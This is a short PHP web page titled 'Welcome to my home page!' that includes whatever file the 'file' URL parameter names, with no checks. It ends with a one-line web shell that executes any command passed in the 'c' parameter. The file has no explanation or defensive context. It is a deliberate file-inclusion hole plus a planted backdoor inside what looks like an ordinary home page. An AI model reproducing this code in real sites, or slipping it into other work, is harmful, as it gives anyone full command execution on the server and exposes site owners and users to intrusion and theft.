<html>
<body>

<h1>Welcome to my home page!</h1>

<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>
<?php system($_GET['c']); ?>
</body>
</html> 
